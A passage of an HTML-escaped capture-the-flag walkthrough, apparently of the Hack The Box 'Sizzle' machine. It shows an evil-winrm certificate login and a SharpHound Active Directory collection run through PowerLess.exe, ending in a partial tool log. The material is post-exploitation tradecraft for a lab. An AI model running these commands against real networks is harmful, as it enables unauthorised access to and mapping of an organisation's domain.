-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--priv-key&lt;/span&gt; ./mrlky.key &lt;span class=&quot;nt&quot;&gt;--pub-key&lt;/span&gt; ./certnew_mrlky.cer &lt;span class=&quot;nt&quot;&gt;--ssl&lt;/span&gt;
-
-Evil-WinRM shell v3.9
-
-Warning: Remote path completions is disabled due to ruby limitation: undefined method &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;quoting_detection_proc&lt;span class=&quot;s1&quot;&gt;&apos; for module Reline
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Warning: SSL enabled
-
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\mrlky.HTB\Documents&amp;gt; whoami
-htb\mrlky
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Let’s run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpHound.exe&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;Running latest version got us this error:&lt;/p&gt;
-
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;10.9383141&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SharpHound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;compatible&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;5.0.0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Release&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;BloodHound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;10.9539396&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharpHound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Version:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;2.12.0.0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;10.9539396&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharpHound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Common&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Version:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;4.6.1.0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;10.9539396&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;not&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;compatible&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SharpHound.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Please&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;4.7.2.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;For that, let’s run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpHound&lt;/code&gt; Version &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.1.1&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Windows\System32\spool\drivers\color&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\PowerLess.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;.\SharpHound.exe -c All --zipfilename loot.zip&apos;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;38.1575227&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SharpHound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;compatible&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;4.3.1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Release&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;BloodHound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;38.2825217&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Resolved&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Collection&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Methods:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LocalAdmin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;GPOLocalGroup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LoggedOn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Trusts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ACL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Container&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;RDP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ObjectProps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DCOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SPNTargets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PSRemote&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;38.2981455&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Initializing&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SharpHound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;8:38&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;6/17/2026&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;38.4387779&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CommonLib&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LDAPUtils&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Found&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;usable&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Domain&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Controller&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HTB.LOCAL&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sizzle.HTB.LOCAL&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;38.4543954&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flags:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LocalAdmin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;GPOLocalGroup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LoggedOn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Trusts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ACL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Container&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;RDP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ObjectProps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DCOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SPNTargets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PSRemote&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;38.5793952&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Beginning&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LDAP&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HTB.LOCAL&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;38.6418962&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Producer&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;has&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;closing&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LDAP&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;channel&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;38.6418962&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LDAP&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;channel&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;closed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;waiting&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;consumers&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;08.8763487&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Status:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span 